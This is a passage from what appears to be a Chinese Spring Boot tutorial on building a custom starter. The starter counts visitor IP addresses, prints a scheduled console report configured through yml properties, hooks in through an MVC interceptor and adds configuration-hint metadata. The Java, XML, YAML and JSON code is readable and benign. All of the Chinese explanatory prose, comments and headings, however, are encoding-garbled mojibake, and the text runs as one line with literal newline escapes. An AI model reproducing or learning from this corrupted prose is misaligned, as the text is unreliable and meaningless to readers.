spring.factories\n            â””â”€â”€ application.yml\n```\n\n## â‘ IPè®¡æ•°ä¸šåŠ¡åŠŸèƒ½å¼€å‘\n\n**æ­¥éª¤ä¸€ï¼šåˆ›å»ºå…¨æ–°çš„æ¨¡å—ï¼Œå®šä¹‰ä¸šåŠ¡åŠŸèƒ½ç±»**\n\nåˆ›å»ºwebæ¨¡å—`ipcount-spring-boot-starter`ï¼Œå®šä¹‰ä¸€ä¸ªä¸šåŠ¡ç±»ï¼Œå£°æ˜ä¸€ä¸ªMapå¯¹è±¡ï¼Œç”¨äºè®°å½•ipè®¿é—®æ¬¡æ•°ï¼Œkeyæ˜¯ipåœ°å€ï¼Œvalueæ˜¯è®¿é—®æ¬¡æ•°\n\n```java\npublic class IpCountService {\n    private Map<String,Integer> ipCountMap = new HashMap<String,Integer>();\n}\n```\n\næœ‰äº›å°ä¼™ä¼´å¯èƒ½ä¼šæœ‰ç–‘é—®ï¼Œä¸è®¾ç½®æˆé™æ€çš„ï¼Œå¦‚ä½•åœ¨æ¯æ¬¡è¯·æ±‚æ—¶è¿›è¡Œæ•°æ®å…±äº«å‘¢ï¼Ÿè®°å¾—ï¼Œå½“å‰ç±»åŠ è½½æˆbeanä»¥åæ˜¯ä¸€ä¸ªå•ä¾‹å¯¹è±¡ï¼Œå¯¹è±¡éƒ½æ˜¯å•ä¾‹çš„ï¼Œå“ªé‡Œå­˜åœ¨å¤šä¸ªå¯¹è±¡å…±äº«å˜é‡çš„é—®é¢˜ã€‚\n\n**æ­¥éª¤äºŒï¼šåˆ¶ä½œç»Ÿè®¡åŠŸèƒ½**\n\nåˆ¶ä½œç»Ÿè®¡æ“ä½œå¯¹åº”çš„æ–¹æ³•ï¼Œæ¯æ¬¡è®¿é—®åå¯¹åº”ipçš„è®°å½•æ¬¡æ•°+1ã€‚éœ€è¦åˆ†æƒ…å†µå¤„ç†ï¼Œå¦‚æœå½“å‰æ²¡æœ‰å¯¹åº”ipçš„æ•°æ®ï¼Œæ–°å¢ä¸€æ¡æ•°æ®ï¼Œå¦åˆ™å°±ä¿®æ”¹å¯¹åº”keyçš„å€¼+1å³å¯\n\n```java\npublic class IpCountService {\n    private Map<String,Integer> ipCountMap = new HashMap<String,Integer>();\n    public void count(){\n        //æ¯æ¬¡è°ƒç”¨å½“å‰æ“ä½œï¼Œå°±è®°å½•å½“å‰è®¿é—®çš„IPï¼Œç„¶åç´¯åŠ è®¿é—®æ¬¡æ•°\n        //1.è·å–å½“å‰æ“ä½œçš„IPåœ°å€\n        String ip = null;\n        //2.æ ¹æ®IPåœ°å€ä»Mapå–å€¼ï¼Œå¹¶é€’å¢\n        Integer count = ipCountMap.get(ip);\n        if(count == null){\n            ipCountMap.put(ip,1);\n        }else{\n            ipCountMap.put(ip,count + 1);\n        }\n    }\n}\n```\n\nå› ä¸ºå½“å‰åŠŸèƒ½æœ€ç»ˆå¯¼å…¥åˆ°å…¶ä»–é¡¹ç›®ä¸­è¿›è¡Œï¼Œè€Œå¯¼å…¥å½“å‰åŠŸèƒ½çš„é¡¹ç›®æ˜¯ä¸€ä¸ªwebé¡¹ç›®ï¼Œå› æ­¤å¯ä»¥ä»å®¹å™¨ä¸­ç›´æ¥è·å–è¯·æ±‚å¯¹è±¡ï¼Œè·å–IPåœ°å€çš„æ“ä½œå¯ä»¥é€šè¿‡è‡ªåŠ¨è£…é…å¾—åˆ°è¯·æ±‚å¯¹è±¡ï¼Œç„¶åè·å–å¯¹åº”çš„è®¿é—®IP\n\n```java\npublic class IpCountService {\n    private Map<String,Integer> ipCountMap = new HashMap<String,Integer>();\n    @Autowired\n    //å½“å‰çš„requestå¯¹è±¡çš„æ³¨å…¥å·¥ä½œç”±ä½¿ç”¨å½“å‰web-starterçš„å·¥ç¨‹æä¾›è‡ªåŠ¨è£…é…\n    private HttpServletRequest httpServletRequest;\n    public void count(){\n        //æ¯æ¬¡è°ƒç”¨å½“å‰æ“ä½œï¼Œå°±è®°å½•å½“å‰è®¿é—®çš„IPï¼Œç„¶åç´¯åŠ è®¿é—®æ¬¡æ•°\n        //1.è·å–å½“å‰æ“ä½œçš„IPåœ°å€\n        String ip = httpServletRequest.getRemoteAddr();\n        //2.æ ¹æ®IPåœ°å€ä»Mapå–å€¼ï¼Œå¹¶é€’å¢\n        Integer count = ipCountMap.get(ip);\n        if(count == null){\n            ipCountMap.put(ip,1);\n        }else{\n            ipCountMap.put(ip,count + 1);\n        }\n        //æ‰“å°å‡ºä¿¡æ¯\n        System.out.println(ipCountMap);\n    }\n}\n\n//ä¼˜åŒ–åä»£ç \npublic class IpCountService {\n    private Map<String, Integer> ipCountMap = new HashMap<>();\n    @Autowired\n    //å½“å‰çš„requestå¯¹è±¡çš„æ³¨å…¥å·¥ä½œç”±ä½¿ç”¨å½“å‰starterçš„å·¥ç¨‹æä¾›è‡ªåŠ¨è£…é…\n    private HttpServletRequest httpServletRequest;\n    public void count(){\n        String ip = httpServletRequest.getRemoteAddr();\n        ipCountMap.put(ip,ipCountMap.getOrDefault(ip,0) + 1);\n        System.out.println(ipCountMap);\n    }\n}\n```\n\n**æ­¥éª¤ä¸‰ï¼šå®šä¹‰è‡ªåŠ¨é…ç½®ç±»**\n\næˆ‘ä»¬éœ€è¦åšåˆ°çš„æ•ˆæœæ˜¯å¯¼å…¥å½“å‰æ¨¡å—å³å¼€å¯æ­¤åŠŸèƒ½ï¼Œå› æ­¤ä½¿ç”¨è‡ªåŠ¨é…ç½®å®ç°åŠŸèƒ½çš„è‡ªåŠ¨è£…è½½ï¼Œéœ€è¦å¼€å‘è‡ªåŠ¨é…ç½®ç±»åœ¨å¯åŠ¨é¡¹ç›®æ—¶åŠ è½½å½“å‰åŠŸèƒ½ã€‚\n\n```java\n@Configuration\npublic class IpAutoConfiguration {\n    @Bean\n    public IpCountService ipCountService(){\n        return new IpCountService();\n    }\n}\n```\n\nè‡ªåŠ¨é…ç½®ç±»éœ€è¦åœ¨spring.factoriesæ–‡ä»¶ä¸­åšé…ç½®æ–¹å¯è‡ªåŠ¨è¿è¡Œã€‚\n\n```properties\n# Auto Configure\norg.springframework.boot.autoconfigure.EnableAutoConfiguration=\\\n  com.jianjian.autoconfigure.IpAutoConfiguration\n```\n\n**æ­¥éª¤å››ï¼šåœ¨å…¶å®ƒé¡¹ç›®ä¸­æ¨¡æ‹Ÿè°ƒç”¨ï¼Œæµ‹è¯•åŠŸèƒ½**\n\nåœ¨å…¶å®ƒé¡¹ç›®è°ƒç”¨æœ¬é¡¹ç›®ï¼Œå¯¼å…¥å½“å‰å¼€å‘çš„starterï¼Œåˆ‡è®°ä½¿ç”¨ä¹‹å‰å…ˆcleanåinstallå®‰è£…åˆ°mavenä»“åº“ï¼Œç¡®ä¿èµ„æºæ›´æ–°\n\n```xml\n<dependency>\n    <groupId>com.jianjian</groupId>\n    <artifactId>ipcount-spring-boot-starter</artifactId>\n    <version>0.0.1-SNAPSHOT</version>\n</dependency>\n```\n\næ¨èé€‰æ‹©è°ƒç”¨æ–¹ä¾¿çš„åŠŸèƒ½åšæµ‹è¯•ï¼Œæ¨èä½¿ç”¨åˆ†é¡µæ“ä½œï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æ¢å…¶ä»–åŠŸèƒ½ä½ç½®è¿›è¡Œæµ‹è¯•ã€‚\n\n```java\n@RestController\n@RequestMapping(\"/books\")\npublic class BookController {\n    @Autowired\n    private IpCountService ipCountService; //å¼•å…¥å¯¹è±¡\n    @GetMapping(\"{currentPage}/{pageSize}\")\n    public R getPage(@PathVariable int currentPage,@PathVariable int pageSize,Book book){\n        ipCountService.count(); //æµ‹è¯•åŠŸèƒ½\n        IPage<Book> page = bookService.getPage(currentPage, pageSize,book);\n        if( currentPage > page.getPages()){\n            page = bookService.getPage((int)page.getPages(), pageSize,book);\n        }\n        return new R(true, page);\n    }\n}\n```\n\n**å½“å‰æ•ˆæœ**ï¼šæ¯æ¬¡è°ƒç”¨åˆ†é¡µæ“ä½œåï¼Œå¯ä»¥åœ¨æ§åˆ¶å°è¾“å‡ºå½“å‰è®¿é—®çš„IPåœ°å€\n\n<font color=\"#f0f\"><b>æ¸©é¦¨æç¤º</b></font>\n\nç”±äºå½“å‰åˆ¶ä½œçš„åŠŸèƒ½éœ€è¦åœ¨å¯¹åº”çš„è°ƒç”¨ä½ç½®è¿›è¡Œåæ ‡å¯¼å…¥ï¼Œå› æ­¤å¿…é¡»ä¿éšœä»“åº“ä¸­å…·æœ‰å½“å‰å¼€å‘çš„åŠŸèƒ½ï¼Œæ‰€ä»¥æ¯æ¬¡åŸå§‹ä»£ç ä¿®æ”¹åï¼Œéœ€è¦é‡æ–°ç¼–è¯‘å¹¶å®‰è£…åˆ°ä»“åº“ä¸­ã€‚ä¸ºé˜²æ­¢é—®é¢˜å‡ºç°ï¼Œå»ºè®®æ¯æ¬¡å®‰è£…ä¹‹å‰å…ˆ`clean`ç„¶å`install`ï¼Œä¿éšœèµ„æºè¿›è¡Œäº†æ›´æ–°ã€‚åˆ‡è®°åˆ‡è®°ï¼ï¼\n\n## â‘¡å®šæ—¶ä»»åŠ¡æŠ¥è¡¨å¼€å‘\n\nå½“å‰å·²ç»å®ç°äº†åœ¨ä¸šåŠ¡åŠŸèƒ½ç±»ä¸­è®°å½•è®¿é—®æ•°æ®ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰å®šæ—¶è¾“å‡ºç›‘æ§çš„ä¿¡æ¯åˆ°æ§åˆ¶å°ã€‚ç”±äºç›‘æ§ä¿¡æ¯éœ€è¦æ¯10ç§’è¾“å‡º1æ¬¡ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨å®šæ—¶å™¨åŠŸèƒ½ã€‚æ­¤å¤„é€‰ç”¨Springå†…ç½®çš„taskä½œä¸ºå®ç°æ–¹æ¡ˆã€‚\n\n**æ­¥éª¤ä¸€ï¼šå¼€å¯å®šæ—¶ä»»åŠ¡åŠŸèƒ½**\n\nå®šæ—¶ä»»åŠ¡åŠŸèƒ½å¼€å¯éœ€è¦åœ¨å½“å‰åŠŸèƒ½çš„æ€»é…ç½®ä¸­è®¾ç½®ï¼Œç»“åˆç°æœ‰ä¸šåŠ¡è®¾å®šï¼Œæ¯”è¾ƒåˆç†çš„ä½ç½®æ˜¯è®¾ç½®åœ¨è‡ªåŠ¨é…ç½®ç±»ä¸Šã€‚åŠ è½½è‡ªåŠ¨é…ç½®ç±»å³å¯ç”¨å®šæ—¶ä»»åŠ¡åŠŸèƒ½ã€‚\n\n```JAVA\n@EnableScheduling\npublic class IpAutoConfiguration {\n    @Bean\n    public IpCountService ipCountService(){\n        return new IpCountService();\n    }\n}\n```\n\n**æ­¥éª¤äºŒï¼šåˆ¶ä½œæ˜¾ç¤ºç»Ÿè®¡æ•°æ®åŠŸèƒ½**\n\nå®šä¹‰æ˜¾ç¤ºç»Ÿè®¡åŠŸèƒ½çš„æ“ä½œprint()ï¼Œå¹¶è®¾ç½®å®šæ—¶ä»»åŠ¡ï¼Œå½“å‰è®¾ç½®æ¯5ç§’è¿è¡Œä¸€æ¬¡ç»Ÿè®¡æ•°æ®ã€‚\n\n```JAVA\npublic class IpCountService {\n  \n    private Map<String,Integer> ipCountMap = new HashMap<String,Integer>();\n\n    @Scheduled(cron = \"0/5 * * * * ?\")\n    public void print(){\n        System.out.println(\"         IPè®¿é—®ç›‘æ§\");\n        System.out.println(\"+-----ip-address-----+--num--+\");\n        for (Map.Entry<String, Integer> entry : ipCountMap.entrySet()) {\n            String key = entry.getKey();\n            Integer value = entry.getValue();\n            System.out.println(String.format(\"|%18s  |%5d  |\",key,value));\n        }\n        System.out.println(\"+--------------------+-------+\");\n      }\n}\n```\n\næ˜¾ç¤ºæ ·å¼\n\n```bash\n\n         IPè®¿é—®ç›‘æ§\n+-----ip-address-----+--num--+\n|         127.0.0.1  |    1  |\n+--------------------+-------+\n```\n\n**å½“å‰æ•ˆæœ**ï¼šæ¯æ¬¡è°ƒç”¨åˆ†é¡µæ“ä½œåï¼Œå¯ä»¥åœ¨æ§åˆ¶å°çœ‹åˆ°ç»Ÿè®¡æ•°æ®ï¼Œåˆ°æ­¤åŸºç¡€åŠŸèƒ½å·²ç»å¼€å‘å®Œæ¯•ã€‚\n\n## â‘¢ä½¿ç”¨å±æ€§è®¾ç½®åŠŸèƒ½å‚æ•°\n\nç”±äºå½“å‰æŠ¥è¡¨æ˜¾ç¤ºçš„ä¿¡æ¯æ ¼å¼å›ºå®šï¼Œä¸ºæé«˜æŠ¥è¡¨ä¿¡æ¯æ˜¾ç¤ºçš„çµæ´»æ€§ï¼Œéœ€è¦é€šè¿‡ymlæ–‡ä»¶è®¾ç½®å‚æ•°ï¼Œæ§åˆ¶æŠ¥è¡¨çš„æ˜¾ç¤ºæ ¼å¼ã€‚\n\n**æ­¥éª¤ä¸€ï¼šå®šä¹‰å‚æ•°æ ¼å¼**\n\nè®¾ç½®3ä¸ªå±æ€§ï¼Œåˆ†åˆ«ç”¨æ¥æ§åˆ¶æ˜¾ç¤ºå‘¨æœŸï¼ˆcycleï¼‰ï¼Œé˜¶æ®µæ•°æ®æ˜¯å¦æ¸…ç©ºï¼ˆcycleResetï¼‰ï¼Œæ•°æ®æ˜¾ç¤ºæ ¼å¼ï¼ˆmodelï¼‰\n\n```yaml\ntools:\n  ip:\n    cycle: 10\n    cycleReset: false\n    model: \"detail\"\n```\n\n**æ­¥éª¤äºŒï¼šå®šä¹‰å°è£…å‚æ•°çš„å±æ€§ç±»ï¼Œè¯»å–é…ç½®å‚æ•°**\n\nä¸ºé˜²æ­¢é¡¹ç›®ç»„å®šä¹‰çš„å‚æ•°ç§ç±»è¿‡å¤šï¼Œäº§ç”Ÿå†²çªï¼Œé€šå¸¸è®¾ç½®å±æ€§å‰ç¼€ä¼šè‡³å°‘ä½¿ç”¨ä¸¤çº§å±æ€§ä½œä¸ºå‰ç¼€è¿›è¡ŒåŒºåˆ†ã€‚\n\n```java\n@Data\n@ConfigurationProperties(prefix = \"tools.ip\")\npublic class IpProperties {\n    /**\n     * æ—¥å¿—æ˜¾ç¤ºå‘¨æœŸ\n     */\n    private Long cycle = 5L; //é»˜è®¤å€¼\n    /**\n     * æ˜¯å¦å‘¨æœŸå†…é‡ç½®æ•°æ®\n     */\n    private Boolean cycleReset = false;\n    /**\n     * æ—¥å¿—è¾“å‡ºæ¨¡å¼  detailï¼šè¯¦ç»†æ¨¡å¼  simpleï¼šæç®€æ¨¡å¼\n     */\n    private String model = LogModel.DETAIL.value;\n    public enum LogModel{\n        DETAIL(\"detail\"),\n        SIMPLE(\"simple\");\n        private String value;\n        LogModel(String value) {\n            this.value = value;\n        }\n        public String getValue() {\n            return value;\n        }\n    }\n}\n```\n\næ—¥å¿—è¾“å‡ºæ¨¡å¼æ˜¯åœ¨è‹¥å¹²ä¸ªç±»åˆ«é€‰é¡¹ä¸­é€‰æ‹©æŸä¸€é¡¹ï¼Œå¯¹äºæ­¤ç§åˆ†ç±»æ€§æ•°æ®å»ºè®®åˆ¶ä½œæšä¸¾å®šä¹‰åˆ†ç±»æ•°æ®ï¼Œå½“ç„¶ä½¿ç”¨å­—ç¬¦ä¸²ä¹Ÿå¯ä»¥ã€‚\n\n**æ­¥éª¤ä¸‰ï¼šåŠ è½½å±æ€§ç±»**\n\n```java\n@EnableScheduling\n@EnableConfigurationProperties(IpProperties.class)\npublic class IpAutoConfiguration {\n    @Bean\n    public IpCountService ipCountService(){\n        return new IpCountService();\n    }\n}\n```\n\n**æ­¥éª¤å››ï¼šåº”ç”¨é…ç½®å±æ€§**\n\nåœ¨åº”ç”¨é…ç½®å±æ€§çš„åŠŸèƒ½ç±»ä¸­ï¼Œä½¿ç”¨è‡ªåŠ¨è£…é…åŠ è½½å¯¹åº”çš„é…ç½®beanï¼Œç„¶åä½¿ç”¨é…ç½®ä¿¡æ¯åšåˆ†æ”¯å¤„ç†ã€‚\n\næ³¨æ„ï¼šæ¸…é™¤æ•°æ®çš„åŠŸèƒ½ä¸€å®šè¦åœ¨è¾“å‡ºåè¿è¡Œï¼Œå¦åˆ™æ¯æ¬¡æŸ¥é˜…çš„æ•°æ®å‡ä¸ºç©ºç™½æ•°æ®ã€‚\n\n```java\npublic class IpCountService {\n    private Map<String,Integer> ipCountMap = new HashMap<String,Integer>();\n    @Autowired\n    private IpProperties ipProperties;\n    @Scheduled(cron = \"0/5 * * * * ?\")\n    public void print(){\nif(ipProperties.getModel().equals(IpProperties.LogModel.DETAIL.getValue())){\n            System.out.println(\"         IPè®¿é—®ç›‘æ§\");\n            System.out.println(\"+-----ip-address-----+--num--+\");\n            for (Map.Entry<String, Integer> entry : ipCountMap.entrySet()) {\n                String key = entry.getKey();\n                Integer value = entry.getValue();\n                System.out.println(String.format(\"|%18s  |%5d  |\",key,value));\n            }\n            System.out.println(\"+--------------------+-------+\");\n        }else if(ipProperties.getModel().equals(IpProperties.LogModel.SIMPLE.getValue())){\n            System.out.println(\"     IPè®¿é—®ç›‘æ§\");\n            System.out.println(\"+-----ip-address-----+\");\n            for (String key: ipCountMap.keySet()) {\n                System.out.println(String.format(\"|%18s  |\",key));\n            }\n            System.out.println(\"+--------------------+\");\n        }\n        //é˜¶æ®µå†…ç»Ÿè®¡æ•°æ®å½’é›¶\n        if(ipProperties.getCycleReset()){\n            ipCountMap.clear();\n        }\n    }\n}\n```\n\n**å½“å‰æ•ˆæœ**ï¼šåœ¨webç¨‹åºç«¯å¯ä»¥é€šè¿‡æ§åˆ¶ymlæ–‡ä»¶ä¸­çš„é…ç½®å‚æ•°å¯¹ç»Ÿè®¡ä¿¡æ¯è¿›è¡Œæ ¼å¼æ§åˆ¶ã€‚ä½†æ˜¯æ•°æ®æ˜¾ç¤ºå‘¨æœŸè¿˜æœªè¿›è¡Œæ§åˆ¶ã€‚\n\n## â‘£ä½¿ç”¨å±æ€§è®¾ç½®å®šæ—¶å™¨å‚æ•°\n\nåœ¨ä½¿ç”¨å±æ€§é…ç½®ä¸­çš„æ˜¾ç¤ºå‘¨æœŸæ•°æ®æ—¶ï¼Œé‡åˆ°äº†ä¸€äº›é—®é¢˜ã€‚ç”±äºæ— æ³•åœ¨@Scheduledæ³¨è§£ä¸Šç›´æ¥ä½¿ç”¨é…ç½®æ•°æ®ï¼Œæ”¹ç”¨æ›²çº¿æ•‘å›½çš„æ–¹é’ˆï¼Œæ”¾å¼ƒä½¿ç”¨@EnableConfigurationPropertiesæ³¨è§£å¯¹åº”çš„åŠŸèƒ½ï¼Œæ”¹æˆæœ€åŸå§‹çš„beanå®šä¹‰æ ¼å¼ã€‚\n\n**æ­¥éª¤ä¸€ï¼šå±æ€§ç±»å®šä¹‰beanå¹¶æŒ‡å®šbeançš„è®¿é—®åç§°**\n\nå¦‚æœæ­¤å¤„ä¸è®¾ç½®beançš„è®¿é—®åç§°ï¼Œspringä¼šä½¿ç”¨è‡ªå·±çš„å‘½åç”Ÿæˆå™¨ç”Ÿæˆbeançš„é•¿åç§°ï¼Œæ— æ³•å®ç°å±æ€§çš„è¯»å–\n\n```java\n@Component(\"ipProperties\")\n@ConfigurationProperties(prefix = \"tools.ip\")\npublic class IpProperties {\n}\n```\n\n**æ­¥éª¤äºŒï¼š@Scheduledæ³¨è§£ä½¿ç”¨`#{}`è¯»å–beanå±æ€§å€¼**\n\næ­¤å¤„è¯»å–beanåç§°ä¸ºipPropertiesçš„beançš„cycleå±æ€§å€¼\n\n```java\n@Scheduled(cron = \"0/#{ipProperties.cycle} * * * * ?\")\npublic void print(){\n}\n```\n\n**æ­¥éª¤ä¸‰ï¼šå¼ƒç”¨@EnableConfigurationPropertiesæ³¨è§£å¯¹åº”çš„åŠŸèƒ½ï¼Œæ”¹ä¸ºå¯¼å…¥beançš„å½¢å¼åŠ è½½é…ç½®å±æ€§ç±»**\n\n```java\n@EnableScheduling\n//@EnableConfigurationProperties(IpProperties.class)\n@Import(IpProperties.class)\npublic class IpAutoConfiguration {\n    @Bean\n    public IpCountService ipCountService(){\n        return new IpCountService();\n    }\n}\n```\n\n**å½“å‰æ•ˆæœ**ï¼šåœ¨webç¨‹åºç«¯å¯ä»¥é€šè¿‡æ§åˆ¶ymlæ–‡ä»¶ä¸­çš„é…ç½®å‚æ•°å¯¹ç»Ÿè®¡ä¿¡æ¯çš„æ˜¾ç¤ºå‘¨æœŸè¿›è¡Œæ§åˆ¶\n\n## â‘¤ä½¿ç”¨æ‹¦æˆªå™¨å¼€å‘\n\nç›®å‰åŸºç¡€åŠŸèƒ½åŸºæœ¬ä¸Šå·²ç»å®Œæˆäº†åˆ¶ä½œï¼Œä¸‹é¢è¿›è¡Œæ‹¦æˆªå™¨çš„å¼€å‘ã€‚ä½¿ç”¨æ‹¦æˆªå™¨åä½¿ç”¨æ—¶ä¸éœ€è¦å†å¼•å…¥å¯¹è±¡è°ƒç”¨æ–¹æ³•äº†ï¼Œå¯¼å…¥ starter å³å¯å®ç°åŠŸèƒ½ã€‚\n\n**æ­¥éª¤ä¸€ï¼šå¼€å‘æ‹¦æˆªå™¨**\n\nä½¿ç”¨è‡ªåŠ¨è£…é…åŠ è½½ç»Ÿè®¡åŠŸèƒ½çš„ä¸šåŠ¡ç±»ï¼Œå¹¶åœ¨æ‹¦æˆªå™¨ä¸­è°ƒç”¨å¯¹åº”åŠŸèƒ½\n\n```java\npublic class IpCountInterceptor implements HandlerInterceptor {\n    @Autowired\n    private IpCountService ipCountService;\n    @Override\n    public boolean preHandle(HttpServletRequest request, \n                             HttpServletResponse response, Object handler) throws Exception {\n        ipCountService.count();\n        return true;\n    }\n}\n```\n\n**æ­¥éª¤äºŒï¼šé…ç½®æ‹¦æˆªå™¨**\n\né…ç½®mvcæ‹¦æˆªå™¨ï¼Œè®¾ç½®æ‹¦æˆªå¯¹åº”çš„è¯·æ±‚è·¯å¾„ã€‚æ­¤å¤„æ‹¦æˆªæ‰€æœ‰è¯·æ±‚ï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®ä½¿ç”¨éœ€è¦è®¾ç½®è¦æ‹¦æˆªçš„è¯·æ±‚ã€‚ç”šè‡³å¯ä»¥åœ¨æ­¤å¤„åŠ è½½IpCountPropertiesä¸­çš„å±æ€§ï¼Œé€šè¿‡é…ç½®è®¾ç½®æ‹¦æˆªå™¨æ‹¦æˆªçš„è¯·æ±‚ã€‚\n\n```java\n@Configuration\npublic class SpringMvcConfig implements WebMvcConfigurer {\n    @Override\n    public void addInterceptors(InterceptorRegistry registry) {\n        registry.addInterceptor(ipCountInterceptor()).addPathPatterns(\"/**\");\n    }\n    @Bean\n    public IpCountInterceptor ipCountInterceptor(){\n        return new IpCountInterceptor();\n    }\n}\n```\n\n**æ­¥éª¤ä¸‰ï¼šå»é™¤ä¹‹å‰çš„æ–¹æ³•**\n\n```java\n@RestController\n@RequestMapping(\"/books\")\npublic class BookController {\n    //@Autowired å»æ‰\n    //private IpCountService ipCountService; å»æ‰\n    @GetMapping(\"{currentPage}/{pageSize}\")\n    public R getPage(@PathVariable int currentPage,@PathVariable int pageSize,Book book){\n        //ipCountService.count();  å»æ‰\n        IPage<Book> page = bookService.getPage(currentPage, pageSize,book);\n        if( currentPage > page.getPages()){\n            page = bookService.getPage((int)page.getPages(), pageSize,book);\n        }\n        return new R(true, page);\n    }\n}\n```\n\n**å½“å‰æ•ˆæœ**ï¼šåœ¨webç¨‹åºç«¯å¯¼å…¥å¯¹åº”çš„starterååŠŸèƒ½å¼€å¯ï¼Œå»æ‰åæ ‡ååŠŸèƒ½æ¶ˆå¤±ï¼Œå®ç°è‡ªå®šä¹‰starterçš„æ•ˆæœã€‚\n\n## â‘¥å¼€å¯ymlæç¤ºåŠŸèƒ½\n\næˆ‘ä»¬åœ¨ä½¿ç”¨springbootçš„é…ç½®å±æ€§æ—¶ï¼Œéƒ½å¯ä»¥çœ‹åˆ°æç¤ºï¼Œå¯¼å…¥äº†å¯¹åº”çš„starteråï¼Œä¹Ÿä¼šæœ‰å¯¹åº”çš„æç¤ºä¿¡æ¯å‡ºç°ã€‚ä½†æ˜¯ç°åœ¨æˆ‘ä»¬çš„starteræ²¡æœ‰å¯¹åº”çš„æç¤ºåŠŸèƒ½ï¼Œè¿™ç§è®¾å®šå°±éå¸¸çš„ä¸å‹å¥½ï¼Œæœ¬èŠ‚è§£å†³è‡ªå®šä¹‰starteråŠŸèƒ½å¦‚ä½•å¼€å¯é…ç½®æç¤ºçš„é—®é¢˜ã€‚springbootæä¾›æœ‰ä¸“ç”¨çš„å·¥å…·å®ç°æ­¤åŠŸèƒ½ï¼Œä»…éœ€å¯¼å…¥ä¸‹åˆ—åæ ‡ã€‚\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-configuration-processor</artifactId>\n</dependency>\n```\n\nç¨‹åºç¼–è¯‘åï¼Œåœ¨target/META-INFç›®å½•ä¸­ä¼šç”Ÿæˆå¯¹åº”çš„`json`æç¤ºæ–‡ä»¶ï¼Œç„¶åæ‹·è´`json`æ–‡ä»¶åˆ°è‡ªå·±å¼€å‘çš„META-INFç›®å½•ä¸­ï¼Œå¹¶å¯¹å…¶è¿›è¡Œè‡ªå®šä¹‰ç¼–è¾‘ã€‚ç”Ÿæˆçš„ä¿¡æ¯æ¥è‡ªäºå±æ€§ç±»çš„æ³¨é‡Šä¿¡æ¯ã€‚æ‰“å¼€ç”Ÿæˆçš„`json`æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚\n\n```JAVA\n{\n  \"groups\": [\n    {\n      \"name\": \"tools.ip\",\n      \"type\": \"com.jianjian.properties.IpProperties\",\n      \"sourceType\": \"com.jianjian.properties.IpProperties\"\n    }\n  ],\n  \"properties\": [\n    {\n      \"name\": \"tools.ip.cycle\",\n      \"type\": \"java.lang.Long\",\n      \"description\": \"æ—¥å¿—æ˜¾ç¤ºå‘¨æœŸ\",\n      \"sourceType\": \"com.jianjian.properties.IpProperties\",\n      \"defaultValue\": 5\n    },\n    {\n      \"name\": \"tools.ip.cycle-reset\",\n      \"type\": \"java.lang.Boolean\",\n      \"description\": \"æ˜¯å¦å‘¨æœŸå†…é‡ç½®æ•°æ®\",\n      \"sourceType\": \"com.jianjian.properties.IpProperties\",\n      \"defaultValue\": false\n    },\n    {\n      \"name\": \"tools.ip.model\",\n      \"type\": \"java.lang.String\",\n      \"description\": \"æ—¥å¿—è¾“å‡ºæ¨¡å¼  detailï¼šè¯¦ç»†æ¨¡å¼  simpleï¼šæç®€æ¨¡å¼\",\n      \"sourceType\": \"com.jianjian.properties.IpProperties\"\n    }\n  ],\n  \"hints\": [\n    {\n      \"name\": \"tools.ip.model\",\n      \"values\": [\n        {\n          \"value\": \"detail\",\n          \"description\": \"è¯¦ç»†æ¨¡å¼.\"\n        },\n        {\n          \"value\": \"simple\",\n          \"description\": \"æç®€æ¨¡å¼.\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n- `groupså±æ€§`å®šä¹‰äº†å½“å‰é…ç½®çš„æç¤ºä¿¡æ¯æ€»ä½“æè¿°ï¼Œå½“å‰é…ç½®å±äºå“ªä¸€ä¸ªå±æ€§å°è£…ç±»ï¼Œ\n\n- `propertieså±æ€§`æè¿°äº†å½“å‰é…ç½®ä¸­æ¯ä¸€ä¸ªå±æ€§çš„å…·ä½“è®¾ç½®ï¼ŒåŒ…å«åç§°ã€ç±»å‹ã€æè¿°ã€é»˜è®¤å€¼ç­‰ä¿¡æ¯ã€‚\n- `hintså±æ€§`é»˜è®¤æ˜¯ç©ºç™½çš„ï¼Œæ²¡æœ‰è¿›è¡Œè®¾ç½®ã€‚`hintså±æ€§`å¯ä»¥å‚è€ƒspringbootæºç ä¸­çš„åˆ¶ä½œï¼Œè®¾ç½®å½“å‰å±æ€§å°è£…ç±»ä¸“ç”¨çš„æç¤ºä¿¡æ¯ï¼Œä¸Šé¢ä¸ºæ—¥å¿—è¾“å‡ºæ¨¡å¼å±æ€§modelè®¾ç½®äº†ä¸¤ç§å¯é€‰æç¤ºä¿¡æ¯ã€‚\n\n**æ€»ç»“**\n\n1. è‡ªå®šä¹‰starterå…¶å®å°±æ˜¯åšä¸€ä¸ªç‹¬ç«‹çš„åŠŸèƒ½æ¨¡å—ï¼Œæ ¸å¿ƒæŠ€æœ¯æ˜¯åˆ©ç”¨è‡ªåŠ¨é…ç½®çš„æ•ˆæœåœ¨åŠ è½½æ¨¡å—ååŠ è½½å¯¹åº”çš„åŠŸèƒ½\n2. é€šå¸¸ä¼šä¸ºè‡ªå®šä¹‰starterçš„è‡ªåŠ¨é…ç½®åŠŸèƒ½æ·»åŠ è¶³å¤Ÿçš„æ¡ä»¶æ§åˆ¶ï¼Œè€Œä¸ä¼šåšæˆ100%åŠ è½½å¯¹åŠŸèƒ½çš„æ•ˆæœ\n3. æœ¬ä¾‹ä¸­ä½¿ç”¨mapä¿å­˜æ•°æ®ï¼Œå¦‚æœæ¢ç”¨redisæ–¹æ¡ˆï¼Œåœ¨starterå¼€å‘æ¨¡å—ä¸­å°±è¦å¯¼å…¥rediså¯¹åº”çš„starter\n4. å¯¹äºé…ç½®å±æ€§åŠ¡å¿…å¼€å¯æç¤ºåŠŸèƒ½ï¼Œå¦åˆ™ä½¿ç”¨è€…æ— 